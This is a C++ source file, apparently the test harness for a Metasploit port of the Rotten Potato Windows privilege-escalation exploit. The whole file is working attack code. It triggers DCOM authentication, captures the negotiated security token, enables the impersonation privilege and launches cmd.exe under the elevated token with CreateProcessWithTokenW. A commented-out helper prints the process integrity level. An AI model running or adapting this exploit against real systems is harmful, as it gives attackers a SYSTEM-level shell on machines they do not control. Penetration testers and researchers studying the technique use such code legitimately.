// MSFRottenPotatoTestHarness.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "MSFRottenPotato.h"

int main()
{
	CMSFRottenPotato* test = new CMSFRottenPotato();
	test->startCOMListenerThread();
	test->startRPCConnectionThread();
	test->triggerDCOM();
	int ret = 0;
	while (true) {
		if (test->negotiator->authResult != -1) {
			/*Enable the priv if possible*/
			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;

			// Get a token for this process. 

			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return 0;

			// Get the LUID for the Impersonate privilege. 
			int res = LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME,
				&tkp.Privileges[0].Luid);

			tkp.PrivilegeCount = 1;  // one privilege to set    
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			// Get the impersonate priv for this process. 
			res = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			HANDLE elevated_token;
			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);

			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			BOOL result;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);

			wchar_t *cmdPath = L"C:\\Windows\\System32\\cmd.exe";
			wchar_t *args = L"";

			printf("Running %S with args %S\n", cmdPath, args);

			result = CreateProcessWithTokenW(elevated_token,
				0,
				cmdPath,
				args,
				CREATE_NEW_CONSOLE,
				NULL,
				NULL,
				&si,
				&pi);

			if (!result) {
				printf("[-] Failed to create proc: %d\n", GetLastError());
			}

			break;
		}
		else {
			printf("Waiting for auth...");
			Sleep(500);
		}
	}

	printf("Auth result: %d\n", test->negotiator->authResult);
	printf("Return code: %d\n", ret);
	printf("Last error: %d\n",GetLastError());
	return ret;
}

/*void
DumpIL(HANDLE token){

    PTOKEN_MANDATORY_LABEL integrity = NULL;
    DWORD dwIntegrityLevel;
    integrity = (PTOKEN_MANDATORY_LABEL)GetInfoFromToken(token, TokenIntegrityLevel);
    dwIntegrityLevel = *GetSidSubAuthority(integrity->Label.Sid,
        (DWORD)(UCHAR)(*GetSidSubAuthorityCount(integrity->Label.Sid) - 1));

    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
    {
        // Low Integrity
        wprintf(L"Low Process\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
        dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
    {
        // Medium Integrity
        wprintf(L"Medium Process\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
    {
        // High Integrity
        wprintf(L"High Integrity Process\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
    {
        // System Integrity
        wprintf(L"System Integrity Process\n");
    }
}*/

